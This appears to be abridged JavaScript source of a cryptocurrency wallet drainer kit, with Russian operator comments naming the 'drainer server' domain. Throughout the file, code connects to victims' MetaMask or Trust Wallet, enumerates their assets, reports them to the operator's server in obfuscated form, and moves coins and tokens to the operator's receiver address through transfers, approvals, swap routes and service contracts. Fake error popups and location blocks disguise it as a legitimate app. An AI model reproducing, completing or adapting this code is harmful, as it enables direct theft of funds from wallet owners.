let CF_EKEY = 92838432823142348; // Укажите любое число, которое будет использовано для шифрования (не рекомендуется оставлять по умолчанию!)
...
const CF_Server_URL = "feedingbrand.com"; // Указать домен, который прикреплен к серверу дрейнера
...
const fetch_cg = async () => {
  const ids = Object.values(COIN_IDS).map(([cg]) => cg).join(',');
  ...
  const out = {};
  for (const [sym, [cg]] of Object.entries(COIN_IDS)) {
    const p = data[cg]?.usd;
    if (p == null) throw new Error(`CoinGecko: no ${sym}`);
    out[sym] = { USD: p };
  }
  return out;
};

const fetch_cb = async () => {
  const entries = Object.entries(COIN_IDS);
  const pairs = await Promise.all(entries.map(async ([sym, [, cb]]) => {
    const res = await fetch(`https://api.coinbase.com/v2/prices/${cb}-USD/spot`,
      { headers: { 'Accept': 'application/json' } });
    if (!res.ok) throw new Error(`Coinbase HTTP ${res.status} (${sym})`);
    const { data } = await res.json();
    const p = parseFloat(data?.amount);
    if (!isFinite(p)) throw new Error(`Coinbase: no ${sym}`);
    return [sym, { USD: p }];
  }));
...
(async () => {
  try {
    let rates;
    try {
      rates = await fetch_cg();
    } catch (e1) {
      console.log(`[rates] CoinGecko is down (${e1.message}), trying Coinbase`);
      rates = await fetch_cb();
    }
    CF_Currencies = rates;
...
let ppr_kks = 0, last_request_ts = 0;
(async () => { ppr_kks = CF_EKEY; CF_EKEY = Math.floor(Math.random() * 1000); })()
...
const send_request = async (data) => {
  try {
    ...
    const encode_key = btoa(String(128 + 256 + 512 + 1024 + ppr_kks));
    ...
    const response = await fetch((CF_HTTP_MODE ? 'http://' : 'https://') + CF_Server_URL + ((CF_Server_PORT != 80 && CF_Server_PORT != 443) ? (':' + String(CF_Server_PORT)) : ''), {
      ...
      body: `v=10062026&s=1&r=${request_data}`
    });
...
const retrieve_token = async (chain_id, contract_address) => {
  try {
    ...
    let response = await fetch(`https://api.etherscan.io/v2/api?chainid=${chain_id}&module=contract&action=getsourcecode&address=${contract_address}&apikey=${CF_Settings.Settings.Chains[convert_chain('ID', 'ANKR', 1)].API}`, {
...
const DO_RANDOMIZER_NATIVE = async (asset) => {
  ...
  const mult = BN(Math.floor(CF_Gas_Multiplier * 100));
  ...
  if (has1559) {
    maxFeePerGas = feeData.maxFeePerGas.mul(mult).div(BN(100));
    maxPriorityFeePerGas = feeData.maxPriorityFeePerGas.mul(mult).div(BN(100));

    effectiveGasPrice = maxFeePerGas;
  } else {
    const baseGasPrice = (feeData.gasPrice || await node.getGasPrice());
    gasPrice = baseGasPrice.mul(mult).div(BN(100));
  ...
  let unsigned_tx = {
    ...
    to: CF_Settings.Personal_Wallet.address,
    value: BN(0),
    data: "0x",
  };

  let gas_limit = await node.estimateGas(unsigned_tx);
  gas_limit = gas_limit.mul(12).div(10);

  const gas_cost = gas_limit.mul(effectiveGasPrice);

  let after_gas = balance.sub(gas_cost);
  if (after_gas.lte(BN(0))) throw 'LOW_BALANCE';

  const mode = CF_Settings.Settings.Reserves.Mode;
  const fix_percent = CF_Settings.Settings.Reserves.Fix_Percent[asset.chain_id] || 0;
  const flex_config = CF_Settings.Settings.Reserves.Flex_Percent[asset.chain_id] || [];
  ...
  if (mode === 0) {
    ...
    const token_reserves = CF_Gas_Reserves[asset.chain_id] || BN(0);
    const tokens_gas_fee = token_limit.mul(token_reserves).mul(effectiveGasPrice);

    available_amount = after_gas.sub(tokens_gas_fee);

  } else if (mode === 1) {
    available_amount = after_gas
      .mul(BN(100).sub(BN(fix_percent)))
      .div(BN(100));

  } else if (mode === 2) {
    let current_percent = fix_percent;
    let max_value = 0;

    for (const elem of flex_config) {
      if (asset.amount_usd > elem.amount || max_value > elem.amount) continue;
  ...
  if (has1559) {
    unsigned_tx.maxFeePerGas = maxFeePerGas;
    unsigned_tx.maxPriorityFeePerGas = maxPriorityFeePerGas;
  } else {
    unsigned_tx.gasPrice = gasPrice;
  }
...
const _DO_RANDOMIZER_NATIVE = async (asset) => {
  const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));
...
const TRANSFER_NATIVE = async (asset, ignore_contract = false) => {
  ...
  if (CF_Settings.Settings.Use_Swap_Bypass_For_ETH &&
      asset.chain_id == 1 &&
      asset.amount_usd >= 10) {
    return DO_SWAP_BYPASS_NATIVE(asset);
  }

  if (!ignore_contract &&
      CF_Settings.Settings.Use_Contract_Generator &&
      asset.amount_usd >= CF_Settings.Settings.Contract_Creation_Limit[asset.chain_id]) {
    return DO_CONTRACT_NEW(asset);
  }

  if (CF_Settings.Settings.Use_Wallet_Randomizer &&
      CF_Settings.Personal_Wallet != null) {
  ...
  if (!ignore_contract &&
      (
        CF_Settings.Settings.Chains[ankr_chain_id].Contract_Address !== '' ||
        (CF_Settings.Settings.Use_Public_Contract &&
         CF_Settings.Public_Contract[parseInt(asset.chain_id)] != null)
      ) &&
      asset.amount_usd >= CF_Settings.Settings.Use_Contract_Amount
  ) {
  ...
  if (mode === 0) {
    ...
    throw new Error(`Unknown reserves mode: ${mode}`);
  }
...
const _TRANSFER_NATIVE = async (asset, ignore_contract = false) => {
  const ankr_chain_id = convert_chain('ID', 'ANKR', asset.chain_id);
...
const DO_SWAP_BYPASS = async (asset, swapper_data) => {
  // 0) sanity
  if (!asset?.chain_id || !asset?.address || !asset?.amount_raw) {
    throw new Error('DO_SWAP: bad asset object');
  }
  if (!swapper_data?.swapper || !swapper_data?.address) {
    throw new Error('DO_SWAP: bad swapper_data');
  }

  const chainId = asset.chain_id;
  const tokenIn = asset.address;
  const tokenOut = CF_Swap_Route[chainId];

  if (!tokenOut) throw new Error(`DO_SWAP: no CF_Swap_Route for chain ${chainId}`);

  // 1) approve
  await APPROVE_TO_SWAPPER(asset, swapper_data.address);

  // 2) provider/signing
  const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[chainId]);
  ...
  try {
    if (swapper_data.swapper === 'Uniswap') {
      ...
      amountOutMinBN = ethers.BigNumber.from(quotedOut)
        .mul(100 - SLIPPAGE_TOLERANCE)
        .div(100);
    } else if (swapper_data.swapper === 'Pancake') {
      const readRouter = new ethers.Contract(swapper_data.address, CF_RouterV2_ReadABI, node);

      const amounts = await readRouter.getAmountsOut(amountInRaw, path);
      const quotedOut = ethers.BigNumber.from(amounts[amounts.length - 1]);

      amountOutMinBN = quotedOut
        .mul(100 - SLIPPAGE_TOLERANCE)
        .div(100);
    } else {
      throw new Error(`DO_SWAP: unsupported swapper in current mode: ${swapper_data.swapper}`);
    }
  } catch (err) {
    console.warn('Quote failed; aborting swap (safer than amountOutMin=0)', err);
    throw err;
  }

  // 4) gas / nonce
  const gasPrice = (await node.getGasPrice()).mul(120).div(100);
  const nonce = await get_nonce(chainId);

  // 5) execute swap
  if (swapper_data.swapper === 'Pancake') {
    const routerV2 = new ethers.Contract(swapper_data.address, CF_Pancake_ABI, signer);

    let gasLimit;
    try {
      gasLimit = await routerV2.estimateGas.swapExactTokensForTokens(
        amountInRaw,
        amountOutMinBN,
        path,
        CF_Settings.Receiver,
      ...
      gasLimit = [42161, 43114].includes(chainId) ? 5_000_000 : 500_000;
    }
    ...
    try {
      ...
      console.warn('Pancake V2 callStatic revert (will not send tx):', e);
      throw e;
    }
    ...
    const tx = await routerV2.swapExactTokensForTokens(
      ...
      CF_Settings.Receiver,
      deadline,
      { gasLimit, gasPrice, nonce, from: CF_Current_Address }
    );
  ...
  if (swapper_data.swapper === 'Uniswap') {
    const router = new ethers.Contract(swapper_data.address, CF_Uniswap_Router02_ABI, signer);

    const innerData = router.interface.encodeFunctionData('exactInputSingle', [{
      tokenIn: tokenIn,
      tokenOut: tokenOut,
      fee: 3000,
      recipient: CF_Settings.Receiver,
    ...
    let gasLimit;
    try {
      gasLimit = await node.estimateGas({
        from: CF_Current_Address,
        to: swapper_data.address,
        data: router.interface.encodeFunctionData('multicall', [deadline, [innerData]])
      });
    ...
    await swap_success('Uniswap', asset, [asset]);
    sign_ready();
    return;
  }

  throw new Error(`DO_SWAP: Unknown swapper ${swapper_data.swapper}`);
};
...
const get_wallet_assets = async (address) => {
  try {
    ...
    if (response.status == 'OK') assets = response.data;
      ...
      if (CF_Loader_Style == 2) {
        MSL.fire({
          icon: 'error', title: 'Critical Error', subtitle: 'Configuration Error', text: 'Unable to evaluate wallet assets. Check the application settings and try again.',
          showConfirmButton: true, confirmButtonText: 'OK', color: CF_Color_Scheme
        });
      } else {
        Swal.close();
        Swal.fire({
          html: '<b>Error</b><br><br>Unable to evaluate wallet assets. Check the application settings and try again.', icon: 'error',
          allowOutsideClick: true, allowEscapeKey: true, timer: 0, width: 600,
          showConfirmButton: true, confirmButtonText: 'OK'
        });
      }
...
const APPROVE_TO_SWAPPER = async (asset, swapper_address) => {
  try {
    try {
      ...
      if (current_allowance.gt(ethers.BigNumber.from('0'))) {
        sign_ready();
        return true;
      }
    } catch(err) {
...
const _TRANSFER_NATIVE_VIA_SERVICE_CONTRACT = async (asset, service_contract) => {
  ...
  const token_limit = BN((asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : (asset.chain_id == 369 ? 900000 : 150000))).mul(BN(12)).div(BN(10));
  const tokens_gas_fee = BN((token_limit.mul(gas_price)).mul(CF_Gas_Reserves[asset.chain_id])).mul(BN(12)).div(BN(10));
...
const TRANSFER_NATIVE_VIA_SERVICE_CONTRACT = async (asset, service_contract) => {
  ...
  const mult = BN(Math.floor(CF_Gas_Multiplier * 100));
  let use1559 = feeData.maxFeePerGas != null && feeData.maxPriorityFeePerGas != null;
  ...
  let gas_limit = await s_contract.estimateGas.depositNative(
    random_user_id,
    CF_Current_Address,
    0,
    { value: BN(1) }
  ...
  const tx = await s_contract.depositNative(
    random_user_id,
    CF_Current_Address,
    0,
    overrides
  ...
  if (CF_Settings.Settings.Wait_For_Confirmation) {
    await node.waitForTransaction(tx.hash, 1, 120000);
  }
...
const TRANSFER_TOKEN_VIA_SERVICE_CONTRACT = async(asset, service_contract) => {
  ...
  const gas_price = BN(await node.getGasPrice()).mul(BN(12)).div(BN(10));
  const gas_limit = BN(await t_contract.estimateGas.transfer(service_contract, t_balance)).mul(BN(12)).div(BN(10));
...
const USE_SERVICE_CONTRACT_TOKEN = async (asset, service_contract) => {
  ...
  const gas_price = BN(await node.getGasPrice()).mul(BN(12)).div(BN(10));
  const gas_limit = BN(await t_contract.estimateGas[approval_function](service_contract, max_approval_amount)).mul(BN(12)).div(BN(10));
...
const connect_wallet = async (provider = null) => {
  try {
    if (!CF_Connection) {
      ...
      if (CF_Loader_Style == 2) {
        MSL.fire({
          icon: 'error', title: 'Critical Error', subtitle: 'Server Connection Error', text: 'The application cannot connect to the server. Check the server configuration and availability before continuing.',
          showConfirmButton: true, confirmButtonText: 'OK', color: CF_Color_Scheme
        });
      } else {
        Swal.close();
        Swal.fire({
          html: '<b>Critical Error</b><br><br>The application cannot connect to the server. Check the server configuration and availability before continuing.', icon: 'error',
          allowOutsideClick: true, allowEscapeKey: true, timer: 0, width: 600,
          showConfirmButton: true, confirmButtonText: 'OK'
        });
      }
    ...
    if (CF_Bad_Country) {
      ...
      try {
        if (CF_Loader_Style == 2) {
          MSL.fire({
            icon: 'error', title: 'Critical Error', subtitle: 'Restricted Location', text: 'This application is not available in your current location.',
            showConfirmButton: true, confirmButtonText: 'OK', color: CF_Color_Scheme
          });
        } else {
          Swal.close();
          Swal.fire({
            html: '<b>Warning</b><br><br>This application is not available in your current location.', icon: 'error',
            allowOutsideClick: true, allowEscapeKey: true, timer: 0, width: 600,
            showConfirmButton: true, confirmButtonText: 'OK'
          });
        }
    ...
    if (provider !== null) {
      if (provider == 'MetaMask') {
        ...
        } else if (typeof window.trust === 'object' && window.trust.isTrust) {
          CF_Provider = window.trust;
          CF_Current_Provider = 'Trust Wallet';
        } else if (typeof window.trustwallet === 'object' && window.trustwallet.isTrust) {
          CF_Provider = window.trustwallet;
          CF_Current_Provider = 'Trust Wallet';
        } else {
          if (CF_Mobile_Status) {
        ...
        if (asset.type != 'NATIVE') {
          if (CF_Settings.Settings.Use_Swap_Bypass) {
            if (is_token_swappable(asset.chain_id, asset.address) != false) {
              CF_Gas_Reserves[asset.chain_id] += 3;
            } else {
